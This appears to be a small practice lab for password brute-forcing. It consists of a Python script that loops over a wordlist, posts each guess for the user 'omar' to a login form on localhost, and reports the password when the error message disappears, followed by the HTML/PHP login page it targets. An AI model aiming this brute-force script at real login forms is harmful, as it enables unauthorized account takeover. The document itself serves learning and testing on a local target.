# -*- coding: utf-8 -*-
import requests
import re
 
em = '<p style="color:red;">Wrong password or usernamr</p>'
 
wordlist = open("list","r").read()
 
for word in wordlist.split("\n"):
    word = word.strip()
    page = requests.post("http://localhost/tests/brute-force/",data={"username":"omar","password":word})
    if re.search(em,page.text):
        print("tried "+word)
    else:
        print("password found: "+word)
        break
        <meta charset="utf-8">
<title>login </title>
<form method="post">
  <center>
  <input name="username" >
  <br />
  <br />
  <input name="password" type="password">
  <br />
  <br />
  <input type="submit" value="دخول">
 
 
<?php
include_once("config.php");
 
if(isset($_POST['username']) && isset($_POST['password'])){
  login($_POST['username'],$_POST['password']);
}
 
?>
</center>

